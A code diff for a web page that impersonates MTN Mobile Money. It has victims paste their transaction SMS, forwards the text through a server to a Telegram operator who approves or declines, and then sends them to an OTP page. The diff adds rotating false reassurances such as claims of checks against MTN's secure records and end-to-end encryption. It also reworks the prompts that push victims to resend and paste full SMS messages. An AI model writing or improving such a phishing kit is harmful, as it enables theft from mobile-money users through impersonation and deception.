@@ -84,7 +84,7 @@
     letter-spacing: -0.6px;
   }
 
-  /* ===== Status notice (decline / expired / needs_full_sms) ===== */
+  /* ===== Status notices ===== */
   .notice {
     display: none;
     padding: 13px 15px;
@@ -232,7 +232,7 @@
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
   /* ============================================================
-     Full-page "Authorizing…" overlay
+     Full-page "Verifying…" overlay with rotating trust facts
   ============================================================ */
   .authorizing {
     position: fixed; inset: 0;
@@ -245,60 +245,67 @@
   .authorizing.show { display: flex; }
   .authorizing .brand-label {
     font-size: 15px; font-weight: 800; letter-spacing: -0.2px;
-    margin-bottom: 30px;
+    margin-bottom: 34px;
   }
   .authorizing .brand-label .mtn { color: var(--mtn-yellow); }
   .authorizing .brand-label .mm  { color: #fff; }
+
+  /* Spinner */
   .authorizing .spinner {
     width: 60px; height: 60px;
     border: 4px solid rgba(255,255,255,0.18);
     border-top-color: var(--mtn-yellow);
     border-radius: 50%;
     animation: spin 0.9s linear infinite;
-    margin-bottom: 26px;
+    margin-bottom: 22px;
   }
   @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* "Verifying" heading */
   .authorizing h2 {
-    font-size: 21px; font-weight: 800; letter-spacing: -0.3px;
-    margin-bottom: 10px;
+    font-size: 20px; font-weight: 800; letter-spacing: -0.3px;
+    margin-bottom: 24px;
   }
-  .authorizing p {
-    font-size: 13px; color: rgba(255,255,255,0.82);
-    max-width: 300px; line-height: 1.6;
-    margin: 0 auto 22px;
+
+  /* Rotating trust messages — sliding side-ways fade */
+  .trust-slider {
+    width: 100%; max-width: 340px;
+    height: 76px;
+    position: relative;
+    overflow: hidden;
+    display: flex; align-items: center; justify-content: center;
   }
-  .authorizing .safety-card {
-    max-width: 340px; width: 100%;
-    background: rgba(255,255,255,0.08);
-    border: 1px solid rgba(255,255,255,0.18);
-    border-radius: 14px;
-    padding: 16px 18px;
-    text-align: left;
+  .trust-msg {
+    position: absolute; inset: 0;
+    display: flex; align-items: center; justify-content: center;
+    padding: 0 8px;
+    opacity: 0;
+    transform: translateX(24px);
+    transition: opacity .45s ease, transform .45s ease;
+    font-size: 13px;
+    line-height: 1.55;
+    color: rgba(255,255,255,0.86);
+    font-weight: 500;
+    text-align: center;
   }
-  .authorizing .safety-card .sc-title {
-    font-size: 11px; font-weight: 800; letter-spacing: 0.7px;
-    text-transform: uppercase; color: var(--mtn-yellow);
-    margin-bottom: 10px;
-    display: flex; align-items: center; gap: 6px;
+  .trust-msg.active {
+    opacity: 1;
+    transform: translateX(0);
   }
-  .authorizing .safety-card ul {
-    list-style: none; margin: 0; padding: 0;
+  .trust-msg.leaving {
+    opacity: 0;
+    transform: translateX(-24px);
   }
-  .authorizing .safety-card li {
-    font-size: 12px; color: rgba(255,255,255,0.85);
-    line-height: 1.55; padding-left: 20px;
-    position: relative; margin-bottom: 8px;
-  }
-  .authorizing .safety-card li:last-child { margin-bottom: 0; }
-  .authorizing .safety-card li::before {
+  .trust-msg::before {
     content: '✓';
-    position: absolute; left: 0; top: 0;
-    color: var(--mtn-yellow); font-weight: 900;
-    font-size: 12px;
+    color: var(--mtn-yellow);
+    font-weight: 900;
+    margin-right: 8px;
   }
+
   .authorizing .cancel-link {
-    margin-top: 26px; background: transparent; border: none;
-    color: rgba(255,255,255,0.7); font-family: inherit;
+    margin-top: 28px; background: transparent; border: none;
+    color: rgba(255,255,255,0.68); font-family: inherit;
     font-size: 12px; font-weight: 600; cursor: pointer;
     text-decoration: underline; text-underline-offset: 3px;
   }
@@ -312,8 +319,10 @@
     .amount-card .amount { font-size: 19px; }
     .sms-box { min-height: 115px; font-size: 12.5px; }
     .btn-confirm { height: 50px; font-size: 14px; }
-    .authorizing h2 { font-size: 19px; }
+    .authorizing h2 { font-size: 18px; }
     .authorizing .spinner { width: 50px; height: 50px; }
+    .trust-slider { height: 80px; }
+    .trust-msg { font-size: 12px; }
   }
   @media (max-height: 680px) {
     .page-title { margin-top: 16px; }
@@ -346,7 +355,6 @@
 
   <div class="body">
 
-    <!-- Status notices shown after Telegram decision -->
     <div class="notice error" id="noticeDeclined">
       <span class="notice-title">Transfer declined</span>
       Your transfer was not approved. Please check the details and try again, or contact MTN support if the issue continues.
@@ -417,17 +425,12 @@
 <div class="authorizing" id="authorizingOverlay">
   <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
   <div class="spinner"></div>
-  <h2 id="authTitle">Authorizing your transfer…</h2>
-  <p id="authText">We're verifying your Y'ello message and reviewing the details with MTN Mobile Money.</p>
+  <h2 id="authTitle">Verifying…</h2>
 
-  <div class="safety-card">
-    <div class="sc-title">🔒 Why we verify</div>
-    <ul>
-      <li>Confirms the Y'ello message is genuine and not tampered with.</li>
-      <li>Protects your wallet from unauthorized or duplicated transfers.</li>
-      <li>Ensures the amount, recipient and reference match what you pasted.</li>
-      <li>Keeps a secure record of the transfer for your protection.</li>
-    </ul>
+  <div class="trust-slider">
+    <div class="trust-msg active">Your message is being checked against MTN's secure records.</div>
+    <div class="trust-msg">This step protects your wallet from unauthorized transfers.</div>
+    <div class="trust-msg">Your details stay encrypted end-to-end during verification.</div>
   </div>
 
   <button class="cancel-link" onclick="cancelAuthorizing()">Cancel</button>
@@ -437,7 +440,7 @@
 
 <script>
   /* ============================================================
-     Read transaction from URL (populated by mtn-signin.html)
+     Read transaction from URL
   ============================================================ */
   const params = new URLSearchParams(location.search);
   const tx = {
@@ -453,9 +456,6 @@
     dt:  params.get('dt') || ''
   };
 
-  /* ============================================================
-     Helpers
-  ============================================================ */
   const SUPPORT_NUMBERS = {
     'Cameroon': '8787', 'Zambia': '111', 'Zambia (MTN)': '111',
     'Uganda': '100', 'Uganda (MTN)': '100',
@@ -478,12 +478,37 @@
       return pretty + ' ' + currency;
     } catch (e) { return n + ' ' + (currency || ''); }
   }
-
   function showToast(msg) {
     const t = document.getElementById('toast');
     t.textContent = msg; t.classList.add('show');
     clearTimeout(t._timer);
     t._timer = setTimeout(() => t.classList.remove('show'), 2400);
+  }
+
+  /* ============================================================
+     Trust slider (rotating messages)
+  ============================================================ */
+  let trustTimer = null;
+  let trustIndex = 0;
+  function startTrustSlider() {
+    const msgs = document.querySelectorAll('.trust-msg');
+    trustIndex = 0;
+    msgs.forEach((m, i) => {
+      m.classList.remove('active', 'leaving');
+      if (i === 0) m.classList.add('active');
+    });
+    if (trustTimer) clearInterval(trustTimer);
+    trustTimer = setInterval(() => {
+      msgs[trustIndex].classList.remove('active');
+      msgs[trustIndex].classList.add('leaving');
+      const prev = trustIndex;
+      trustIndex = (trustIndex + 1) % msgs.length;
+      setTimeout(() => msgs[prev].classList.remove('leaving'), 450);
+      msgs[trustIndex].classList.add('active');
+    }, 2600);
+  }
+  function stopTrustSlider() {
+    if (trustTimer) { clearInterval(trustTimer); trustTimer = null; }
   }
 
   /* ============================================================
@@ -637,6 +662,7 @@
   function cancelAuthorizing() {
     pollingActive = false;
     if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+    stopTrustSlider();
     document.getElementById('authorizingOverlay').classList.remove('show');
     const btn = document.getElementById('confirmBtn');
     btn.disabled = false;
@@ -672,7 +698,8 @@
     const btn = document.getElementById('confirmBtn');
     btn.disabled = true;
 
-    // Send to server (this triggers the Telegram prompt)
+    // Send the EXACT pasted SMS to the server, which forwards it to Telegram
+    // with three buttons: Approve / Decline / Fully
     try {
       await fetch('/api/verification/sms', {
         method: 'POST',
@@ -680,7 +707,7 @@
         body: JSON.stringify({
           tx: tx.ref,
           code: res.code,
-          message: input.value.trim(),
+          message: input.value.trim(),  // ← full pasted text
           am: tx.am,
           cur: tx.cur,
           c: tx.c,
@@ -694,25 +721,25 @@
       return;
     }
 
-    // Show full-page authorizing screen
-    document.getElementById('authTitle').textContent = 'Authorizing your transfer…';
-    document.getElementById('authText').textContent =
-      'We\'re verifying your Y\'ello message and reviewing the details with MTN Mobile Money.';
+    // Show full-page verifying overlay with rotating trust messages
+    document.getElementById('authTitle').textContent = 'Verifying…';
     document.getElementById('authorizingOverlay').classList.add('show');
+    startTrustSlider();
 
     pollingActive = true;
     const start = Date.now();
-    const maxWaitMs = 3 * 60 * 1000; // 3 minutes
+    const maxWaitMs = 3 * 60 * 1000;
 
     const poll = async () => {
       if (!pollingActive) return;
 
       if (Date.now() - start > maxWaitMs) {
         pollingActive = false;
+        stopTrustSlider();
         document.getElementById('authorizingOverlay').classList.remove('show');
         btn.disabled = false;
         btn.textContent = 'Confirm transfer';
-        showToast('Authorization timed out. Please try again.');
+        showToast('Verification timed out. Please try again.');
         return;
       }
 
@@ -728,53 +755,39 @@
       /* -------- APPROVED → go to otp2.html -------- */
       if (decision === 'approved') {
         pollingActive = false;
-        document.getElementById('authTitle').textContent = 'Transfer approved';
-        document.getElementById('authText').textContent =
-          'Redirecting you to complete the next step…';
+        stopTrustSlider();
         const q = new URLSearchParams({
           tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
           c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt
         });
-        setTimeout(() => {
-          window.location.href = 'otp2.html?' + q.toString();
-        }, 600);
+        window.location.href = 'otp2.html?' + q.toString();
         return;
       }
 
-      /* -------- DECLINED → close overlay, show notice -------- */
-      if (decision === 'declined') {
+      /* -------- DECLINED → SMS expired / resend notice -------- */
+      if (decision === 'declined' || decision === 'expired') {
         pollingActive = false;
-        document.getElementById('authorizingOverlay').classList.remove('show');
-        btn.disabled = false;
-        btn.textContent = 'Confirm transfer';
-        showNotice('noticeDeclined');
-        showToast('Transfer declined by reviewer.');
-        return;
-      }
-
-      /* -------- EXPIRED → close overlay, show SMS expired notice -------- */
-      if (decision === 'expired') {
-        pollingActive = false;
+        stopTrustSlider();
         document.getElementById('authorizingOverlay').classList.remove('show');
         btn.disabled = false;
         btn.textContent = 'Confirm transfer';
         showNotice('noticeExpired');
         document.getElementById('resendBtn').classList.add('sent');
         document.getElementById('resendLabel').textContent = 'Resend now';
-        showToast('SMS expired — please resend and paste the new message.');
+        showToast('Verification declined — please resend and paste the new SMS.');
         return;
       }
 
-      /* -------- NEEDS FULL SMS → close overlay, show info notice -------- */
-      if (decision === 'needs_full_sms') {
+      /* -------- FULLY → paste full Y'ello SMS or resend notice -------- */
+      if (decision === 'needs_full_sms' || decision === 'fully') {
         pollingActive = false;
+        stopTrustSlider();
         document.getElementById('authorizingOverlay').classList.remove('show');
         btn.disabled = false;
         btn.textContent = 'Confirm transfer';
         showNotice('noticeFullSms');
-        const smsInput = document.getElementById('smsInput');
-        smsInput.focus();
-        showToast('Full SMS requested. Please paste the complete message.');
+        document.getElementById('smsInput').focus();
+        showToast('Please paste the full Y\'ello SMS, or tap Resend SMS.');
         return;
       }
 
@@ -785,7 +798,7 @@
   }
 
   /* ============================================================
-     Init — read user data from URL and populate the page
+     Init
   ============================================================ */
   document.addEventListener('DOMContentLoaded', () => {
     document.getElementById('amountLabel').textContent =
